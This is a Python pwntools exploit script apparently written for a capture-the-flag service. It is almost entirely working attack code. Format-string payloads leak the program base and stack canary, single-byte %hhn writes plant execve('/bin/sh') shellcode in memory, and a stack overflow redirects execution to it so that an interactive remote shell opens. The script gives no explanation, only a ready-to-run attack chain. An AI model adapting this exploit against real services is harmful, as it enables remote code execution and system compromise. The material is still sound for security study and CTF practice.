#!/usr/bin/env python

from pwn import *

setName = "1"
getName = "2"
setData = "3"
exit = "4"

base = 0
startMainAddr = 0
offset = long(0x24b60)


def Wait():
    sleep(0.05)


def Leak(payload, isString = False):
    
    r.sendline(setName)
    Wait()
    r.sendline(payload)
    Wait()
    r.sendline(getName)
    Wait

    resp = r.recvline_contains('.AAA')[7:-23]
    
    if isString == False:
        return long(resp, 16)
    else:
        return resp



def LeakBase():
    global base

    payload = "%24$p.AAA"

    resp = Leak(payload) 

    base = resp & (~0xfff)
    print "base:", str(hex(base))


def LeakAddr(addr):
    
    print "leaking:", hex(addr)
    
    SetTarget(addr)

    payload = "%7$s.AAA"  
    resp = Leak(payload, True)

    print "Response:", resp

    return resp

def SetTarget(addr):
    
    payload = 'ABCDEFGH' + p64(addr)

    r.sendline(setData)
    Wait()
    r.sendline(payload)
    Wait()
    

def OverWrite(val):

    payload = "%6$" + str(ord(val)) + "c%7$hhn" 
    
    r.sendline(setName)
    Wait()
    r.sendline(payload)
    Wait()
    

def OverWriteOneByte(addr, val):

    SetTarget(addr)

    # resp = Leak("%7$p.AAA")
    # print "check write to stack:", str(hex(resp))
    
    OverWrite(val)

    print "Set Target:", str(hex(addr)), "value:", str(hex(ord(val)))

def LeakCanary():
    
    print "Leak Canary: "
    payload = '%23$p.AAA'
    
    resp = Leak(payload)
    print "Response:", str(resp)

    return resp



r = remote('csie.ctf.tw', 10122)

LeakBase()
canary = LeakCanary()
log.success('Canary: ' + str(canary))

r.sendline(setData)
r.sendline('A' *8)


shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

for i in range(0,len(shellcode)):
    OverWriteOneByte(base + long(i) + long(0x202010), shellcode[i])


r.sendline(setData)
Wait()
r.sendline('ABCDEFGHB' + 'A'*127 + p64(canary) + 'A'*8 + p64(base+long(0x202010)))
Wait()
# r.sendline(exit)
Wait()
r.interactive()
